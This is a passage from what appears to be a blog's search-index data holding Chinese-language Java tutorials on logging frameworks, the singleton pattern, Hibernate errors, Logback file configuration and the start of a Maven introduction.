''\n\n如果项目正常的话，应该会出现下图所示页面\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-36-Screen%20Shot%202018-10-28%20at%2011.51.06%20PM-Wr7ArW.png)\n\nThat's all.\n","categories":["SpringBoot"],"tags":["Java","SpringBoot","Web"]},{"title":"日志框架的使用——如何选择日志框架","url":"/2018/10/2018-10-29-logging-framework/","content":"\n### 什么是日志框架\n\n> 日志框架：是一套能实现日志输出的工具包\n\n> 日志：能够描述系统运行状态的所有事件都可以算作日志\n\n<!-- more -->\n\n### 日志框架的能力\n\n- 定制输出目标（比如输出到文件，输出到数据库，或者是网络第三方服务）\n- 定制输出格式\n- 携带上下文信息（输出的时间戳等，路径，线程，堆栈）\n- 运行时选择性输出（比如只选择某一方面的日志）\n- 灵活的配置\n- 优异的性能\n\n### 日志框架的选择\n\n常用的日志框架有 JUL、JCL、Log4j、Log4j2、Logback、SLF4j、jboss-logging等，这么多日志框架我们选择哪一个好呢？\n\n听我一一道来：\n\n一个优秀的日志方案一定是一个日志门面和一个日志实现组成，也就是说面向接口编程。\n\n- 日志门面包含 JCL、SLF4j、jboss-logging\n- 日志实现包含 Log4j、Log4j2、Logback、JUL\n\n#### Java Util Log\n\n简称 JUL，是 JDK 中自带的 log 功能。虽然是官方自带的 log lib，JUL 的使用确不广泛。主要原因:\n\nJUL 从 JDK 1.4 才开始加入(2002年)，当时各种第三方 log lib 已经被广泛使用了\nJUL 早期存在性能问题，到 JDK1.5 上才有了不错的进步，但现在和 Logback/Log4j2 相比还是有所不如\nJUL 的功能不如 Logback/Log4j2 等完善，比如 Output Handler 就没有 Logback/Log4j2 的丰富，有时候需要自己来继承定制，又比如默认没有从 ClassPath 里加载配置文件的功能。\n\n#### Log4j\n\nLog4j 是在 Logback 出现之前被广泛使用的 Log Lib, 由 Gülcü 于2001年发布，后来成为 Apache 基金会的顶级项目。Log4j 在设计上非常优秀，对后续的 Java Log 框架有长久而深远的影响，也产生了 Log4c, Log4s, Log4perl 等到其他语言的移植。Log4j 的短板在于性能，在 Logback 和 Log4j2 出来之后，Log4j 的使用也减少了。\n\n#### Java Commons Logging\n\n简称 JCL，是 Apache 下面的项目。JCL 是一个 Log Facade，只提供 Log API，不提供实现，然后有 Adapter 来使用 Log4j 或者 JUL 作为 Log Implementation。\n\n就像之前所说，JDK 现在带了自己的JUL，然后又有第三方的 Log4j 等日志库存在，不同的项目可能各自使用了不同的日志库。如果你的项目依赖的其他 lib 各自使用了不同的日志库，你想控制日志行为，就需要针对每个日志库都写一个配置文件，是不是很酸爽?\n\n然后这个时候 JCL 就出现了。在程序中日志创建和记录都是用 JCL 中的接口，在真正运行时，会看当前 ClassPath 中有什么实现，如果有 Log4j 就是用 Log4j, 如果啥都没有就是用 JDK 的 JUL。\n\n这样，在你的项目中，还有第三方的项目中，大家记录日志都使用 JCL 的接口，然后最终运行程序时，可以按照自己的需求(或者喜好)来选择使用合适的 Log Implementation。如果用 Log4j, 就添加 Log4j 的 jar 包进去，然后写一个 Log4j 的配置文件；如果喜欢用 JUL，就只需要写个 JUL 的配置文件。如果有其他的新的日志库出现，也只需要它提供一个 Adapter，运行的时候把这个日志库的 jar 包加进去。\n\n到这个时候一切看起来都很简单，很美好。接口和实现做了良好的分离，在统一的JCL之下，不改变任何代码，就可以通过配置就换用功能更强大，或者性能更好的日志库实现。\n\n> 这种简单美好一直持续到 SLF4J 出现。\n\n#### SLF4J/Logback\n\nSLF4J(The Simple Logging Facade for Java) 和 Logback 也是 Gülcü 创立的项目，其创立主要是为了提供更高性能的实现。其中，SLF4j 是类似于 JCL 的 Log Facade，Logback 是类似于 Log4j 的 Log Implementation。\n\n之前已经说过，Apache 有了个 JCL，用来做各种 Log lib 统一的接口，如果 Gülcü 要搞一个更好的 Log 实现的话，直接写一个实现就好了，为啥还要搞一个和 SLF4J 呢?\n\n原因是 Gülcü 认为 JCL 的 API 设计得不好，容易让使用者写出性能有问题的代码。\n\n比如在用 JCL 输出一个 debug 级别的 log:\n\n```java\nlogger.debug(\"start process request, url:\" + url);\n```\n\n这个有什么问题呢？一般生产环境 log 级别都会设到 info 或者以上，那这条 log 是不会被输出的。然而不管会不会输出，这其中都会做一个字符串连接操作，然后生产一个新的字符串。如果这条语句在循环或者被调用很多次的函数中，就会多做很多无用的字符串连接，影响性能。\n\n所以 JCL 的最佳实践推荐这么写：\n\n```java\nif (logger.isDebugEnabled()) {\n    logger.debug(\"start process request, url:\" + url);\n}\n```\n\n然而开发者常常忽略这个问题或是觉得麻烦而不愿意这么写。所以 SLF4J 提供了新的 API，方便开发者使用:\n\n```java\nlogger.debug(\"start process request, url:{}\", url);\n```\n\n这样的话，在不输出 log 的时候避免了字符串拼接的开销；在输出的时候需要做一个字符串 format，代价比手工拼接字符串大一些，但是可以接受。\n\n而 Logback 则是作为 Log4j 的继承者来开发的，提供了性能更好的实现，异步 logger，Filter 等更多的特性。\n\n现在事情变复杂了。我们有了两个流行的 Log Facade，以及三个流行的 Log Implementation。Gülcü 是个追求完美的人，他决定让这些Log之间都能够方便的互相替换，所以做了各种 Adapter 和 Bridge 来连接:\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-36-v2-4a3df07374fe31dbd6fbff88021630ed-FSIZGs.jpg)\n\n可以看到甚至 Log4j 和 JUL 都可以桥接到SLF4J，再通过 SLF4J 适配到到 Logback!\n\n在这里需要注意不能搞出循环的桥接，比如下面这些依赖就不能同时存在:\n\n1. jcl-over-slf4j 和 slf4j-jcl\n2. log4j-over-slf4j 和 slf4j-log4j12\n3. jul-to-slf4j 和 slf4j-jdk14\n\n总感觉事情在变得更麻烦呢！\n\n#### Log4j2\n\n现在有了更好的 SLF4J 和 Logback——你会想事情到这里总该了解了吧，让他们慢慢取代JCL 和 Log4j 好了。\n\n然而维护 Log4j 的人不这样想，他们不想坐视用户一点点被 SLF4J/Logback 蚕食，继而搞出了 Log4j2。\n\nLog4j2 和 Log4j1.x 并不兼容，设计上很大程度上模仿了 SLF4J/Logback，性能上也获得了很大的提升。\n\nLog4j2 也做了 Facade/Implementation 分离的设计，分成了 log4j-api 和 log4j-core。\n\n现在好了，我们有了三个流行的Log 接口和四个流行的Log实现，如果画出桥接关系的图来回事什么样子呢?\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-37-v2-57092397ff9d7a69d359856ef19e769d-uMe6Ag.jpg) \n\n是不是感觉有点晕呢？同样，在添加依赖的时候，要小心不要搞成循环依赖。\n\n### 实践\n\n上次我们用 IDEA 创建了一个简单的 Java Web Application，我们在这个基础上继续写，由于 SpringBoot 使用的就是 SLF4J 和 Logback，那我们也就使用这一组合。我们在 test 的 com.example.demo.service 这个包里新建一个 LoggerTest 类\n\n```java\npackage com.example.demo.service;\n\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.test.context.junit4.SpringRunner;\n\n/**\n * 一个简单的 LogTest \n *\n * @author 0xl2oot@gmail.com\n * @date 2018/10/30 10:31 AM\n */\n@RunWith(SpringRunner.class)\n@SpringBootTest\npublic class LoggerTest {\n\n    private final Logger logger = LoggerFactory.getLogger(LoggerTest.class);\n\n    @Test\n    public void test1() {\n        logger.debug(\"debug...\");\n        logger.info(\"info...\");\n        logger.error(\"error...\");\n    }\n}\n```\n\n运行这个程序，发现控制台会输出 \n\n```\n2018-10-30 10:35:51.254  INFO 66590 --- [           main] com.example.demo.service.LoggerTest      : info...\n2018-10-30 10:35:51.254 ERROR 66590 --- [           main] com.example.demo.service.LoggerTest      : error...\n```\n\n为什么没有 debug 呢，因为系统默认是 info 之上的级别，所以 debug 是不显示的\n\n那有几种 Level 级别呢？ macOS 可以通过 Command + O 来搜索 Level (Slf4j) \n\n\n```java\npublic enum Level {\n    ERROR(40, \"ERROR\"),\n    WARN(30, \"WARN\"),\n    INFO(20, \"INFO\"),\n    DEBUG(10, \"DEBUG\"),\n    TRACE(0, \"TRACE\");\n\n    private int levelInt;\n    private String levelStr;\n\n    private Level(int i, String s) {\n        this.levelInt = i;\n        this.levelStr = s;\n    }\n}\n```\n\n可以看到一共有 5 种级别。\n\n### 使用 Lombok 简化操作\n\n在 pom.xml 中添加 依赖\n\n```xml\n<dependency>\n    <groupId>org.projectlombok</groupId>\n    <artifactId>lombok</artifactId>\n</dependency>\n```\n\n这样的话，我们就可以这样使用\n\n```java\npackage com.example.demo.service;\n\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.test.context.junit4.SpringRunner;\n\nimport lombok.extern.slf4j.Slf4j;\n\n@RunWith(SpringRunner.class)\n@SpringBootTest\n@Slf4j\npublic class LoggerTest {\n    @Test\n    public void test1() {\n        log.debug(\"debug...\");\n        log.info(\"info...\");\n        log.error(\"error...\");\n    }\n}\n```\n\n\n### 日志框架的最佳实践\n\n#### 1. 总是使用Log Facade，而不是具体Log Implementation\n\n正如之前所说的，使用 Log Facade 可以方便的切换具体的日志实现。而且，如果依赖多个项目，使用了不同的Log Facade，还可以方便的通过 Adapter 转接到同一个实现上。如果依赖项目使用了多个不同的日志实现，就麻烦的多了。\n\n具体来说，现在推荐使用 Log4j-API 或者 SLF4j，不推荐继续使用 JCL。\n\n#### 2. 只添加一个 Log Implementation依赖\n\n毫无疑问，项目中应该只使用一个具体的 Log Implementation，建议使用 Logback 或者 Log4j2。如果有依赖的项目中，使用的 Log Facade 不支持直接使用当前的 Log Implementation，就添加合适的桥接器依赖。具体的桥接关系可以看上面的图。\n\n#### 3. 具体的日志实现依赖应该设置为 optional 和使用 runtime scope\n\n在项目中，Log Implementation 的依赖强烈建议设置为 runtime scope，并且设置为 optional。例如项目中使用了 SLF4J 作为 Log Facade，然后想使用 Log4j2 作为 Implementation，那么使用 maven 添加依赖的时候这样设置:\n\n```xml\n<dependency>\n    <groupId>org.apache.logging.log4j</groupId>\n    <artifactId>log4j-core</artifactId>\n    <version>${log4j.version}</version>\n    <scope>runtime</scope>\n    <optional>true</optional>\n</dependency>\n<dependency>\n    <groupId>org.apache.logging.log4j</groupId>\n    <artifactId>log4j-slf4j-impl</artifactId>\n    <version>${log4j.version}</version>\n    <scope>runtime</scope>\n    <optional>true</optional>\n</dependency>\n```\n\n设为 optional，依赖不会传递，这样如果你是个 lib 项目，然后别的项目使用了你这个 lib，不会被引入不想要的 Log Implementation 依赖；\n\nScope 设置为 runtime，是为了防止开发人员在项目中直接使用 Log Implementation 中的类，而不适用 Log Facade 中的类。\n\n#### 4. 如果有必要, 排除依赖的第三方库中的 Log Impementation 依赖\n\n这是很常见的一个问题，第三方库的开发者未必会把具体的日志实现或者桥接器的依赖设置为 optional，然后你的项目继承了这些依赖——具体的日志实现未必是你想使用的，比如他依赖了 Log4j，你想使用 Logback，这时就很尴尬。另外，如果不同的第三方依赖使用了不同的桥接器和 Log 实现，也极容易形成环。\n\n这种情况下，推荐的处理方法，是使用exclude来排除所有的这些Log实现和桥接器的依赖，只保留第三方库里面对 Log Facade 的依赖。\n\n比如阿里的 JStorm 就没有很好的处理这个问题，依赖 jstorm 会引入对 Logback 和 log4j-over-slf4j 的依赖，如果你想在自己的项目中使用 Log4j 或其他 Log 实现的话，就需要加上 excludes:\n\n```\n<dependency>\n    <groupId>com.alibaba.jstorm</groupId>\n    <artifactId>jstorm-core</artifactId>\n    <version>2.1.1</version>\n    <exclusions>\n        <exclusion>\n            <groupId>org.slf4j</groupId>\n            <artifactId>log4j-over-slf4j</artifactId>\n        </exclusion>\n        <exclusion>\n            <groupId>ch.qos.logback</groupId>\n            <artifactId>logback-classic</artifactId>\n        </exclusion>\n    </exclusions>\n</dependency>\n```\n\n#### 5. 避免为不会输出的log付出代价\n\nLog 库都可以灵活的设置输出界别，所以每一条程序中的 log，都是有可能不会被输出的。这时候要注意不要额外的付出代价。\n\n先看两个有问题的写法：\n\n```java\nlogger.debug(\"start process request, url: \" + url);\nlogger.debug(\"receive request: {}\", toJson(request));\n```\n\n第一条是直接做了字符串拼接，所以即使日志级别高于debug也会做一个字符串连接操作；第二条虽然用了 SLF4J/Log4j2 中的懒求值方式来避免不必要的字符串拼接开销，但是 toJson() 这个函数却是都会被调用并且开销更大。\n\n推荐的写法如下:\n\n```java\nlogger.debug(\"start process request, url:{}\", url); // SLF4J/LOG4J2\nlogger.debug(\"receive request: {}\", () -> toJson(request)); // LOG4J2\nlogger.debug(() -> \"receive request: \" + toJson(request)); // LOG4J2\nif (logger.isDebugEnabled()) { // SLF4J/LOG4J2\n    logger.debug(\"receive request: \" + toJson(request)); \n}\n```\n\n#### 6. 日志格式中最好不要使用行号，函数名等字段\n\n原因是，为了获取语句所在的函数名，或者行号，log 库的实现都是获取当前的 stacktrace，然后分析取出这些信息，而获取 stacktrace 的代价是很昂贵的。如果有很多的日志输出，就会占用大量的 CPU。在没有特殊需要的情况下，建议不要在日志中输出这些这些字段。\n\n最后，log 中不要输出稀奇古怪的字符！\n\n部分开发人员为了方便看到自己的 log，会在 log 语句中加上醒目的前缀，比如:\n\n```java\nlogger.debug(\"========================start process request=============\");\n```\n\n虽然对于自己来说是方便了，但是如果所有人都这样来做的话，那 log 输出就没法看了！正确的做法是使用 grep 来看只自己关心的日志。\n\n\n### 阅读延伸\n\n- [轻松理解面向接口编程！](https://zhuanlan.zhihu.com/p/30572621)\n- [GitHub - Ceki Gulcu](https://github.com/ceki)\n- [GitHub - QOS.CH Sarl](https://github.com/qos-ch)\n\n\n### 参考文献\n\n- [知乎 - Java 日志框架解析(上) - 历史演进](https://zhuanlan.zhihu.com/p/24272450)\n- [知乎 - Java 日志框架解析(下) - 最佳实践](https://zhuanlan.zhihu.com/p/24275518)\n- [slf4j、jcl、jul、log4j1、log4j2、logback大总结](https://my.oschina.net/pingpangkuangmo/blog/410224)\n","categories":["SpringBoot"],"tags":["Java","SpringBoot","JUL","JCL","Log4j","Log4j2","Logback","SLF4F","日志"]},{"title":"【面经】详解单例模式","url":"/2018/10/2018-10-29-singleton/","content":"\n\n### Intent\n\n确保一个类只有一个实例，并提供该实例的全局访问点。\n\n<!-- more -->\n\n### Class Diagram\n\n使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。\n\n私有构造函数保证了不能通过构造函数来创建对象实例，只能通过公有静态函数返回唯一的私有静态变量。\n\n<div align=\"center\"> <img src=\"https://up-img.yonghong.tech/pic/2021/07/29-17-38-562f2844-d77c-40e0-887a-28a7128abd42-UwOro0.png\"/> </div><br>\n\n### Implementation\n\n#### Ⅰ 懒汉式-线程不安全\n\n以下实现中，私有静态变量 uniqueInstance 被延迟实例化，这样做的好处是，如果没有用到该类，那么就不会实例化 uniqueInstance，从而节约资源。\n\n这个实现在多线程环境下是不安全的，如果多个线程能够同时进入 `if (uniqueInstance == null)` ，并且此时 uniqueInstance 为 null，那么会有多个线程执行 `uniqueInstance = new Singleton();` 语句，这将导致实例化多次 uniqueInstance。\n\n```java\npublic class Singleton {\n\n    private static Singleton uniqueInstance;\n\n    private Singleton() {\n    }\n\n    public static Singleton getUniqueInstance() {\n        if (uniqueInstance == null) {\n            uniqueInstance = new Singleton();\n        }\n        return uniqueInstance;\n    }\n}\n```\n\n#### Ⅱ 饿汉式-线程安全\n\n线程不安全问题主要是由于 uniqueInstance 被实例化多次，采取直接实例化 uniqueInstance 的方式就不会产生线程不安全问题。\n\n但是直接实例化的方式也丢失了延迟实例化带来的节约资源的好处。\n\n```java\nprivate static Singleton uniqueInstance = new Singleton();\n```\n\n#### Ⅲ 懒汉式-线程安全\n\n只需要对 getUniqueInstance() 方法加锁，那么在一个时间点只能有一个线程能够进入该方法，从而避免了实例化多次 uniqueInstance。\n\n但是当一个线程进入该方法之后，其它试图进入该方法的线程都必须等待，即使 uniqueInstance 已经被实例化了。这会让线程阻塞时间过长，因此该方法有性能问题，不推荐使用。\n\n```java\npublic static synchronized Singleton getUniqueInstance() {\n    if (uniqueInstance == null) {\n        uniqueInstance = new Singleton();\n    }\n    return uniqueInstance;\n}\n```\n\n#### Ⅳ 双重校验锁-线程安全\n\nuniqueInstance 只需要被实例化一次，之后就可以直接使用了。加锁操作只需要对实例化那部分的代码进行，只有当 uniqueInstance 没有被实例化时，才需要进行加锁。\n\n双重校验锁先判断 uniqueInstance 是否已经被实例化，如果没有被实例化，那么才对实例化语句进行加锁。\n\n```java\npublic class Singleton {\n\n    private volatile static Singleton uniqueInstance;\n\n    private Singleton() {\n    }\n\n    public static Singleton getUniqueInstance() {\n        if (uniqueInstance == null) {\n            synchronized (Singleton.class) {\n                if (uniqueInstance == null) {\n                    uniqueInstance = new Singleton();\n                }\n            }\n        }\n        return uniqueInstance;\n    }\n}\n```\n\n考虑下面的实现，也就是只使用了一个 if 语句。在 uniqueInstance == null 的情况下，如果两个线程都执行了 if 语句，那么两个线程都会进入 if 语句块内。虽然在 if 语句块内有加锁操作，但是两个线程都会执行 `uniqueInstance = new Singleton();` 这条语句，只是先后的问题，那么就会进行两次实例化。因此必须使用双重校验锁，也就是需要使用两个 if 语句。\n\n```java\nif (uniqueInstance == null) {\n    synchronized (Singleton.class) {\n        uniqueInstance = new Singleton();\n    }\n}\n```\n\nuniqueInstance 采用 volatile 关键字修饰也是很有必要的， `uniqueInstance = new Singleton();` 这段代码其实是分为三步执行：\n\n1. 为 uniqueInstance 分配内存空间\n2. 初始化 uniqueInstance\n3. 将 uniqueInstance 指向分配的内存地址\n\n但是由于 JVM 具有指令重排的特性，执行顺序有可能变成 1>3>2。指令重排在单线程环境下不会出先问题，但是在多线程环境下会导致一个线程获得还没有初始化的实例。例如，线程 T<sub>1</sub> 执行了 1 和 3，此时 T<sub>2</sub> 调用 getUniqueInstance() 后发现 uniqueInstance 不为空，因此返回 uniqueInstance，但此时 uniqueInstance 还未被初始化。\n\n使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。\n\n#### Ⅴ 静态内部类实现\n\n当 Singleton 类加载时，静态内部类 SingletonHolder 没有被加载进内存。只有当调用 `getUniqueInstance()` 方法从而触发 `SingletonHolder.INSTANCE` 时 SingletonHolder 才会被加载，此时初始化 INSTANCE 实例，并且 JVM 能确保 INSTANCE 只被实例化一次。\n\n这种方式不仅具有延迟初始化的好处，而且由 JVM 提供了对线程安全的支持。\n\n```java\npublic class Singleton {\n\n    private Singleton() {\n    }\n\n    private static class SingletonHolder {\n        private static final Singleton INSTANCE = new Singleton();\n    }\n\n    public static Singleton getUniqueInstance() {\n        return SingletonHolder.INSTANCE;\n    }\n}\n```\n\n#### Ⅵ 枚举实现\n\n```java\npublic enum Singleton {\n\n    INSTANCE;\n\n    private String objName;\n\n\n    public String getObjName() {\n        return objName;\n    }\n\n\n    public void setObjName(String objName) {\n        this.objName = objName;\n    }\n\n\n    public static void main(String[] args) {\n\n        // 单例测试\n        Singleton firstSingleton = Singleton.INSTANCE;\n        firstSingleton.setObjName(\"firstName\");\n        System.out.println(firstSingleton.getObjName());\n        Singleton secondSingleton = Singleton.INSTANCE;\n        secondSingleton.setObjName(\"secondName\");\n        System.out.println(firstSingleton.getObjName());\n        System.out.println(secondSingleton.getObjName());\n\n        // 反射获取实例测试\n        try {\n            Singleton[] enumConstants = Singleton.class.getEnumConstants();\n            for (Singleton enumConstant : enumConstants) {\n                System.out.println(enumConstant.getObjName());\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n```html\nfirstName\nsecondName\nsecondName\nsecondName\n```\n\n该实现在多次序列化再进行反序列化之后，不会得到多个实例。而其它实现需要使用 transient 修饰所有字段，并且实现序列化和反序列化的方法。\n\n该实现可以防止反射攻击。在其它实现中，通过 setAccessible() 方法可以将私有构造函数的访问级别设置为 public，然后调用构造函数从而实例化对象，如果要防止这种攻击，需要在构造函数中添加防止多次实例化的代码。该实现是由 JVM 保证只会实例化一次，因此不会出现上述的反射攻击。\n\n### 学习效果测评 \n\n以下面这种单例模式为例，思考下面的问题，点击链接跳转到答案\n\n```java\npublic class Singleton {\n\n    private volatile static Singleton uniqueInstance;\n\n    private Singleton() {\n    }\n\n    public static Singleton getUniqueInstance() {\n        if (uniqueInstance == null) {\n            synchronized (Singleton.class) {\n                if (uniqueInstance == null) {\n                    uniqueInstance = new Singleton();\n                }\n            }\n        }\n        return uniqueInstance;\n    }\n}\n```\n\n[1：为什么构造函数要用private修饰？](#class-diagram)\n\n[2：为什么要两次判断instance是否为null？](#ⅲ-懒汉式-线程安全)\n\n[3：volatile有什么作用？放在这个单例中有什么作用？](#ⅳ-双重校验锁-线程安全)\n\n### synchronized 中的 Singleton.class 是什么意思？为什么不是 this？\n\nJava 基本功，getInstance() 是 static 方法！static 方法！static 方法！，所以可以用 this 吗？\n\nJava中每一个对象都可以作为锁，这是synchronized实现同步的基础： \n1. 普通同步方法，锁是当前实例对象 \n2. 静态同步方法，锁是当前类的class对象 \n3. 同步方法块，锁是括号里面的对象\n\n更详细的内容可以参考[深入理解 Java 之 synchronized 到底锁住了什么](https://allenwu.itscoder.com/sync-in-dcl)\n\n### Examples\n\n- Logger Classes\n- Configuration Classes\n- Accesing resources in shared mode\n- Factories implemented as Singletons\n\n### JDK\n\n- [java.lang.Runtime#getRuntime()](http://docs.oracle.com/javase/8/docs/api/java/lang/Runtime.html#getRuntime%28%29)\n- [java.awt.Desktop#getDesktop()](http://docs.oracle.com/javase/8/docs/api/java/awt/Desktop.html#getDesktop--)\n- [java.lang.System#getSecurityManager()](http://docs.oracle.com/javase/8/docs/api/java/lang/System.html#getSecurityManager--)\n\n\n### 参考文献\n\n- [深入理解 Java 之 synchronized 到底锁住了什么](https://allenwu.itscoder.com/sync-in-dcl)\n- [【死磕Java并发】-----深入分析synchronized的实现原理](https://blog.csdn.net/chenssy/article/details/54883355)","categories":["设计模式"],"tags":["Java","volatile","synchronized"]},{"title":"could not initialize proxy - no Session","url":"/2018/10/2018-10-30-could-not-initialize-proxy-no-session/","content":"\n### 报错\n\norg.hibernate.LazyInitializationException: could not initialize proxy [com.example.demo.dataobject.User#1] - no Session\n\n<!-- more -->\n\n### 解决 \n\n解决LazyInitializationException异常大概有这么几种方式\n\n1.关闭LazyInitialization, 将fetch设成eager\n\n2.在spring boot的配置文件application.properties添加spring.jpa.open-in-view=true\n\n3.用spring 的OpenSessionInViewFilter\n\n第一种方式显然不好，无法使用到延迟加载的特性，会带来性能问题\n\n后面两种方式只能用在Servlet容器下,而当我们在spring boot环境下运行单元测试的时候是无法启用OpenSessionInViewFilter的\n\n其实要解决这种情况下的问题也很简单，只需要在单元测试方法@Transactional注解即可解决\n\n```java\n    @Test\n    @Transactional\n    public void getOneTest() {\n        User user = repository.getOne(1);\n        System.out.println(user.toString());\n    }\n```\n\n\n### 参考文献\n\n- [解决Spring Data JPA延迟加载could not initialize proxy - no Session 错误](https://www.cnblogs.com/onone/articles/8962914.html)","categories":["SpringBoot"],"tags":["Java","SpringBoot","spring-data-jpa"]},{"title":"日志框架的使用——如何输出日志到文件","url":"/2018/10/2018-10-30-logging-framework-output-to-file-config/","content":"\n### Logback 的配置\n\napplication.yml 可配置的比较简单\n\nlogback-spring.xml 可以进行复杂的配置\n\n<!-- more -->\n\n比如我们有两个需求\n- 区分 info 和 error 日志\n- 每天产生一个日志文件\n\n这是一个很合理的需求，便于我们查找日志\n\n### 配置 application.yml\n\n```xml\nlogging:\n  pattern:\n    console: \"%d - %msg%n\"\n  file: /var/log/tomcat/sell.log\n  level:\n    com.example : debug\n```\n\n这是最简单的配置，分别配置了控制台输出格式，输出到文件的目录，和日志级别\n\n这里日志级别要用包名，或者精确到类名来控制。像上面这样写的话，就是 com.example 这个包里面是 debug 级别的。\n\n### 配置 logback-spring.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<configuration>\n    <appender name=\"consoleLog\" class=\"ch.qos.logback.core.ConsoleAppender\">\n        <layout class=\"ch.qos.logback.classic.PatternLayout\">\n            <pattern>\n                %d - %msg%n\n            </pattern>\n        </layout>\n    </appender>\n    <root level=\"info\">\n        <appender-ref ref=\"consoleLog\" />\n    </root>\n</configuration>\n```\n\n这是配置控制台的输出，接下来我们配置输出到文件\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<configuration>\n    <appender name=\"consoleLog\" class=\"ch.qos.logback.core.ConsoleAppender\">\n        <layout class=\"ch.qos.logback.classic.PatternLayout\">\n            <pattern>\n                %d - %msg%n\n            </pattern>\n        </layout>\n    </appender>\n    <appender name=\"fileInfoLog\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n        <filter class=\"ch.qos.logback.classic.filter.LevelFilter\">\n            <level>INFO</level>\n            <onMatch>ACCEPT</onMatch>\n            <onMismatch>DENY</onMismatch>\n        </filter>\n        <encoder>\n            <pattern>\n                %d - %msg%n\n            </pattern>\n        </encoder>\n        <!-- 滚动策略 -->\n        <rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\">\n            <!-- 路径 -->\n            <fileNamePattern>/var/log/tomcat/info.%d.log</fileNamePattern>\n        </rollingPolicy>\n    </appender>\n    <appender name=\"fileErrorLog\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n        <filter class=\"ch.qos.logback.classic.filter.LevelFilter\">\n            <level>ERROR</level>\n            <onMatch>ACCEPT</onMatch>\n            <onMismatch>DENY</onMismatch>\n        </filter>\n        <encoder>\n            <pattern>\n                %d - %msg%n\n            </pattern>\n        </encoder>\n        <!-- 滚动策略 -->\n        <rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\">\n            <!-- 路径 -->\n            <fileNamePattern>/var/log/tomcat/error.%d.log</fileNamePattern>\n        </rollingPolicy>\n    </appender>\n    <root level=\"info\">\n        <appender-ref ref=\"consoleLog\" />\n        <appender-ref ref=\"fileInfoLog\" />\n        <appender-ref ref=\"fileErrorLog\" />\n    </root>\n</configuration>\n```\n\n这样之后 我们看文件\n\n```shell\n/var/log/tomcat   \n❯ ls\nerror.2018-10-30.log info.2018-10-30.log\n```\n\n已经出现了文件，并且通过过滤器把 info 和 error 输出到了两个文件 \n\n### 参考文献\n\n- [SpringBoot学习－（十）SpringBoot日志处理](https://blog.csdn.net/qq_28988969/article/details/78085784) \n","categories":["SpringBoot"],"tags":["Java","SpringBoot","Logback","SLF4F","日志"]},{"title":"org.hibernate.HibernateException: Access to ...","url":"/2018/10/2018-10-30-org-hibernate-hibernate-exception/","content":"\n### 报错\n\norg.hibernate.HibernateException: Access to DialectResolutionInfo cannot be null when 'hibernate.dialect' not set\n\n在配置 SpringBoot Jpa 时，觉得已经配置好了，当运行的时候，却报了这个错。\n\n<!-- more -->\n\n### 原因\n\n有可能是选用的数据库不正确，或者数据库的用户名密码错了。还有可能是因为没有设置 Hibernate 的 Dialect。\n但是经过我测试，一般情况下是不用配置 Dialect 的，因为默认已经配置好了。主要原因可能是数据库配置不正确，而不是 Dialect。\n\nHibernate SQL 方言\n\n如果需要配置的话，是这样配置的\n\n1.采用 application.properties 文件\n\n```\nspring.jpa.database-platform=org.hibernate.dialect.MySQL5Dialect\n```\n\n2.采用 application.yml\n\n```xml\ndatabase-platform: org.hibernate.dialect.MySQL5Dialect\n```\n\n常见的 Dialect\n\n\n| RDBMS                | Dialect                                     |\n| -------------------- | ------------------------------------------- |\n| Oracle (any version) | org.hibernate.dialect.OracleDialect         |\n| Oracle9i             | org.hibernate.dialect.Oracle9iDialect       |\n| Oracle10g            | org.hibernate.dialect.Oracle10gDialect      |\n| MySQL                | org.hibernate.dialect.MySQLDialect          |\n| MySQL with InnoDB    | org.hibernate.dialect.MySQLInnoDBDialect    |\n| MySQL with MyISAM    | org.hibernate.dialect.MySQLMyISAMDialect    |\n| DB2                  | org.hibernate.dialect.DB2Dialect            |\n| DB2 AS/400           | org.hibernate.dialect.DB2400Dialect         |\n| DB2 OS390            | org.hibernate.dialect.DB2390Dialect         |\n| Microsoft SQL Server | org.hibernate.dialect.SQLServerDialect      |\n| Sybase               | org.hibernate.dialect.SybaseDialect         |\n| Sybase Anywhere      | org.hibernate.dialect.SybaseAnywhereDialect |\n| PostgreSQL           | org.hibernate.dialect.PostgreSQLDialect     |\n| SAP DB               | org.hibernate.dialect.SAPDBDialect          |\n| Informix             | org.hibernate.dialect.InformixDialect       |\n| HypersonicSQL        | org.hibernate.dialect.HSQLDialect           |\n| Ingres               | org.hibernate.dialect.IngresDialect         |\n| Progress             | org.hibernate.dialect.ProgressDialect       |\n| Mckoi SQL            | org.hibernate.dialect.MckoiDialect          |\n| Interbase            | org.hibernate.dialect.InterbaseDialect      |\n| Pointbase            | org.hibernate.dialect.PointbaseDialect      |\n| FrontBase            | org.hibernate.dialect.FrontbaseDialect      |\n| Firebird             | org.hibernate.dialect.FirebirdDialect       |\n\n### 参考文献\n\n- [GitHub - Hibernate Dialect](https://github.com/hibernate/hibernate-orm/tree/master/hibernate-core/src/main/java/org/hibernate/dialect)\n- [SQL Dialects in Hibernate](https://www.javatpoint.com/dialects-in-hibernate)\n- [Hibernate Doc](http://docs.jboss.org/hibernate/orm/5.3/javadocs/)\n- [Spring Boot下使用JPA报错：'hibernate.dialect' not set的解决办法](https://blog.csdn.net/BeauXie/article/details/75948457)","categories":["SpringBoot"],"tags":["Java","SpringBoot"]},{"title":"Maven 的一些概念和参考","url":"/2018/10/2018-10-31-maven/","content":"\n### Maven 是什么\n\nMaven 翻译为\"专家\"、\"内行\"，是 Apache 下的一个纯 Java 开发的开源项目。基于项目对象模型（缩写：[POM](#pom)）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。\n\nMaven 是一个项目管理工具，可以对 Java 